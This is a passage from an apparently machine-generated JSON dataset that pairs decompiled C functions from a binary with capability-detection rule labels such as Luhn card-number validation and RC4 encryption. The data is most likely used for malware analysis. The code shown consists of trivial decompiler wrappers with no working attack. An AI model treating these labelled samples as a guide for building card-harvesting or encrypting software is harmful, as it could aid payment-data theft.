        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004204e0(int32_t param_1)\n\n{\n    uint32_t arg_8h;\n    uint var_14h;\n    uint var_ch;\n    uint var_10h;\n    uint var_8h;\n    uint arg_8h_00;\n    uchar auStack108 [28];\n    uint uStack80;\n    uint in_stack_ffffffb8;\n    uchar auStack68 [40];\n    uint var_18h;\n    uchar *puStack24;\n    uchar *puStack20;\n    uchar *var_ch_2;\n    int32_t var_8h_2;\n    uint var_1h;\n    \n    puStack20 = &stack0xffffffbc;\n    var_ch_2 = &stack0xffffffbc;\n    puStack24 = &stack0xffffff94;\n    arg_8h_00 = *(param_1 + 0xc);\n    var_8h_2 = param_1;\n    fcn.00420610(arg_8h_00);\n    var_18h = fcn.004150c0(var_ch_2, arg_8h_00);\n    var_1h._0_1_ = fcn.0041ac80(in_stack_ffffffb8);\n    arg_8h = var_1h;\n    uStack80 = 0x420532;\n    fcn.00406250();\n    uStack80 = 0x420539;\n    fcn.00416b80(arg_8h);\n    return;\n}\n",
        "token_count": 353
    },
    "00420540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00420540(int32_t param_1)\n\n{\n    uint32_t arg_8h;\n    uint var_14h;\n    uint var_ch;\n    uint var_10h;\n    uint var_8h;\n    uint arg_8h_00;\n    uchar auStack108 [28];\n    uint uStack80;\n    uint in_stack_ffffffb8;\n    uchar auStack68 [40];\n    uint var_18h;\n    uchar *puStack24;\n    uchar *puStack20;\n    uchar *var_ch_2;\n    int32_t var_8h_2;\n    uint var_1h;\n    \n    puStack20 = &stack0xffffffbc;\n    var_ch_2 = &stack0xffffffbc;\n    puStack24 = &stack0xffffff94;\n    arg_8h_00 = *(param_1 + 0xc);\n    var_8h_2 = param_1;\n    fcn.004205a0(arg_8h_00);\n    var_18h = fcn.004150c0(var_ch_2, arg_8h_00);\n    var_1h._0_1_ = fcn.0041ac80(in_stack_ffffffb8);\n    arg_8h = var_1h;\n    uStack80 = 0x420592;\n    fcn.00406250();\n    uStack80 = 0x420599;\n    fcn.00416b80(arg_8h);\n    return;\n}\n",
        "token_count": 353
    },
    "004205a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004205a0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.004207e0(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 208
    },
    "00420610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420610(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.00420820(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 206
    },
    "00420680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420680(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.004207c0(arg_8h_00);\n    return;\n}\n",
        "token_count": 65
    },
    "004206a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004206a0(uint param_1)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471d70;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    arg_ch = fcn.00408d10(0x30);\n    var_4h = 0;\n    fcn.00401300(0x30, arg_ch);\n    arg_8h = fcn.00401440(var_8h);\n    fcn.0041fe70(arg_8h);\n    *in_FS_OFFSET = var_ch_2;\n    return arg_ch;\n}\n",
        "token_count": 224
    },
    "00420750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00420750(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = 0x4864d4;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00420790(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 104
    },
    "00420790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420790(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041ed10(arg_8h_00);\n    fcn.004567ea();\n    return in_ECX;\n}\n",
        "token_count": 89
    },
    "004207c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004207c0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.004209a0(arg_8h_00);\n    return;\n}\n",
        "token_count": 66
    },
    "004207e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004207e0(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.004209c0(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00420820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00420820(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.00418950(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00420a10(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00420940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420940(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    fcn.00420a60(in_ECX + 4);\n    return;\n}\n",
        "token_count": 74
    },
    "00420970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420970(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(8, arg_8h);\n    fcn.00420aa0(in_ECX + 4);\n    return;\n}\n",
        "token_count": 74
    },
    "004209a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004209a0(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    fcn.00420ae0();\n    return;\n}\n",
        "token_count": 43
    },
    "004209c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004209c0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402930();\n    fcn.00401300(8, uVar1);\n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.00420aa0(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 115
    },
    "00420a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420a10(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402930();\n    fcn.00401300(8, uVar1);\n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.00420a60(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 115
    },
    "00420a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00420a60(uint arg_8h)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_5c452eb11e27b3b64aba3962247a1b66___void___.0;\n    ppcVar1 = fcn.00401440(arg_8h);\n    in_ECX[1] = *ppcVar1;\n    return in_ECX;\n}\n",
        "token_count": 131
    },
    "00420aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00420aa0(uint arg_8h)\n\n{\n    code **ppcVar1;\n    code **in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = vtable.std::_Func_impl_no_alloc_class__lambda_fa53acb66667864286b27edea89b1cc7___void___.0;\n    ppcVar1 = fcn.00401440(arg_8h);\n    in_ECX[1] = *ppcVar1;\n    return in_ECX;\n}\n",
        "token_count": 127
    },
    "00420b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00420b00(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_1h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00420b30(arg_8h_00);\n    return;\n}\n",
        "token_count": 89
    },
    "00420b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420b30(uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.0040e910(uVar1);\n    uVar2 = fcn.00401440(arg_8h);\n    uVar2 = fcn.00420c30(uVar2);\n    uVar3 = fcn.00401440(arg_8h);\n    uVar3 = fcn.00420c10(uVar3);\n    uVar4 = fcn.00401440(arg_8h);\n    uVar4 = fcn.00420bf0(uVar4);\n    fcn.00420ba0(uVar4, uVar3, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 199
    },
    "00420ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420ba0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    \n    uVar1 = fcn.00401440(arg_14h);\n    uVar2 = fcn.00401440(arg_10h);\n    uVar3 = fcn.00401440(arg_ch);\n    puVar4 = fcn.00401440(arg_8h);\n    fcn.00420c50(*puVar4, uVar3, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 151
    },
    "00420bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420bf0(int32_t arg_8h)\n\n{\n    fcn.00401440(arg_8h + 0x28);\n    return;\n}\n",
        "token_count": 41
    },
    "00420c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420c10(int32_t arg_8h)\n\n{\n    fcn.00401440(arg_8h + 0x24);\n    return;\n}\n",
        "token_count": 41
    },
    "00420c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420c30(int32_t arg_8h)\n\n{\n    fcn.00401440(arg_8h + 0xc);\n    return;\n}\n",
        "token_count": 40
    },
    "00420c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420c50(code *param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    uint var_8h;\n    code *var_8h_2;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(var_14h);\n    fcn.0041edf0(uVar1);\n    fcn.00420cb0(uVar1);\n    uVar1 = fcn.00401440(var_10h);\n    fcn.00401440(var_ch);\n    (*var_8h_2)(uVar1);\n    return;\n}\n",
        "token_count": 165
    },
    "00420cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420cb0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471488;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00416d60(uVar1);\n    var_4h = 0;\n    arg_8h_00 = fcn.00401440(&arg_8h);\n    fcn.00420d20(arg_8h_00);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 208
    },
    "00420d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00420d20(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.0041fc30(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.00420e90(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00420e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420e50(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    uint arg_ch_00;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_10h = fcn.00401440(arg_ch);\n    arg_ch_00 = fcn.00401440(arg_8h);\n    fcn.00420f20(in_ECX + 4, arg_ch_00, arg_10h);\n    return;\n}\n",
        "token_count": 113
    },
    "00420ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00420ee0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = 0x48650c;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041edf0(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 106
    },
    "00420f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420f20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    \n    arg_10h_00 = fcn.00401440(arg_10h);\n    arg_ch_00 = fcn.00401440(arg_ch);\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00420f60(arg_8h_00, arg_ch_00, arg_10h_00);\n    return;\n}\n",
        "token_count": 138
    },
    "00420f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420f60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    \n    arg_10h_00 = fcn.00401440(arg_10h);\n    arg_ch_00 = fcn.00401440(arg_ch);\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00420fa0(arg_8h_00, arg_ch_00, arg_10h_00);\n    return;\n}\n",
        "token_count": 138
    },
    "00420fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420fa0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    \n    arg_ch_00 = fcn.00401440(arg_10h);\n    arg_8h_00 = fcn.00401440(arg_ch);\n    fcn.00401440(arg_8h);\n    fcn.00420fe0(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 115
    },
    "00420fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420fe0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint arg_10h;\n    uint var_10h;\n    uint var_8h;\n    uint8_t var_2h;\n    uint var_1h;\n    \n    uVar1 = fcn.00401440(arg_ch);\n    uVar2 = fcn.00401440(arg_8h);\n    uVar1 = fcn.00421040(&var_10h, uVar2, uVar1);\n    uVar2 = fcn.00410ea0();\n    arg_10h = fcn.00402930();\n    fcn.004210a0(var_2h, var_1h, arg_10h, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 214
    },
    "00421040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421040(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4706e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_ch_00 = fcn.00401440(arg_10h);\n    arg_8h_00 = fcn.00401440(arg_ch);\n    fcn.004211f0(arg_8h_00, arg_ch_00);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 184
    },
    "004210a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004210a0(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint arg_8h;\n    \n    uVar1 = fcn.00401440(arg_18h);\n    uVar2 = fcn.00401440(arg_14h);\n    uVar1 = fcn.00421180(uVar2, uVar1);\n    uVar2 = fcn.00401440(arg_18h);\n    uVar3 = fcn.00421150(arg_14h);\n    uVar2 = fcn.00421160(uVar3, uVar2);\n    uVar3 = fcn.00401440(arg_18h);\n    arg_8h = fcn.00421120(arg_14h);\n    uVar3 = fcn.00421130(arg_8h, uVar3);\n    fcn.004211a0(arg_10h, uVar3, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 252
    },
    "00421130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421130(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00401440(arg_ch);\n    fcn.00401440(arg_8h);\n    return;\n}\n",
        "token_count": 47
    },
    "00421150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421150(int32_t arg_8h)\n\n{\n    return arg_8h + 1;\n}\n",
        "token_count": 32
    },
    "00421160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421160(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    \n    arg_ch_00 = fcn.00401440(arg_ch);\n    fcn.00421230(arg_8h, arg_ch_00);\n    return;\n}\n",
        "token_count": 65
    },
    "00421180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421180(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    \n    arg_ch_00 = fcn.00401440(arg_ch);\n    fcn.00421250(arg_8h, arg_ch_00);\n    return;\n}\n",
        "token_count": 65
    },
    "004211a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004211a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_14h_00;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    \n    arg_14h_00 = fcn.00401440(arg_14h);\n    arg_10h_00 = fcn.00401440(arg_10h);\n    arg_ch_00 = fcn.00401440(arg_ch);\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00421270(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00);\n    return;\n}\n",
        "token_count": 178
    },
    "004211f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004211f0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_10h;\n    uint arg_ch_00;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_10h = fcn.00401440(arg_ch);\n    arg_ch_00 = fcn.00401440(arg_8h);\n    fcn.004212c0(0, arg_ch_00, arg_10h);\n    return in_ECX;\n}\n",
        "token_count": 133
    },
    "00421230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421230(uint noname_0, uint arg_ch)\n\n{\n    uint arg_8h;\n    \n    arg_8h = fcn.00401440(arg_ch);\n    fcn.00421310(arg_8h);\n    return;\n}\n",
        "token_count": 60
    },
    "00421250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421250(uint noname_0, uint arg_ch)\n\n{\n    uint arg_8h;\n    \n    arg_8h = fcn.00401440(arg_ch);\n    fcn.0040ba40(arg_8h);\n    return;\n}\n",
        "token_count": 61
    },
    "00421270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421270(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_14h_00;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint *puVar1;\n    \n    arg_14h_00 = fcn.00401440(arg_14h);\n    arg_10h_00 = fcn.00401440(arg_10h);\n    arg_ch_00 = fcn.00401440(arg_ch);\n    puVar1 = fcn.00401440(arg_8h);\n    fcn.00421330(*puVar1, arg_ch_00, arg_10h_00, arg_14h_00);\n    return;\n}\n",
        "token_count": 170
    },
    "004212c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004212c0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00401440(arg_10h);\n    fcn.00419460(0, uVar1);\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.00419920(uVar1);\n    return in_ECX;\n}\n",
        "token_count": 133
    },
    "00421330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421330(code *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    puVar1 = fcn.00401440(arg_14h);\n    uVar3 = *puVar1;\n    uVar2 = fcn.00401440(arg_10h);\n    fcn.00401440(arg_ch);\n    (*arg_8h)(uVar2, uVar3);\n    return;\n}\n",
        "token_count": 125
    },
    "00424fe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424fe8(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint *in_ECX;\n    uint32_t var_4h;\n    \n    uVar2 = in_ECX[4];\n    if (arg_8h <= uVar2) {\n        if (in_ECX[5] - uVar2 < arg_ch) {\n            var_4h = in_ECX & 0xffffff00;\n            fcn.00421754(arg_ch, var_4h, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar2 + arg_ch;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            iVar1 = in_ECX + arg_8h;\n            fcn.00451a80(iVar1 + arg_ch, iVar1, (uVar2 - arg_8h) + 1);\n            fcn.00452000(iVar1, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.00407420();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 300
    },
    "004257ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004257ac(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t arg_8h_00;\n    \n    arg_8h_00 = 0;\n    fcn.00452000(arg_8h, 0, 0x2c);\n    uVar1 = fcn.0045b939();\n    *arg_8h = uVar1;\n    uVar1 = fcn.0045b9b0();\n    arg_8h[1] = uVar1;\n    iVar2 = fcn.0045b987();\n    iVar2 = *(iVar2 + 8);\n    arg_8h[2] = iVar2 == 0;\n    if (iVar2 != 0) {\n        do {\n            iVar2 = fcn.0045be64(arg_8h_00);\n            if (iVar2 != 0) {\n                *((arg_8h_00 >> 3) + 0xc + arg_8h) = *((arg_8h_00 >> 3) + 0xc + arg_8h) | 1 << (arg_8h_00 & 7);\n            }\n            arg_8h_00 = arg_8h_00 + 1;\n        } while (arg_8h_00 < 0x100);\n    }\n    return arg_8h;\n}\n",
        "token_count": 312
    },
    "004260b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
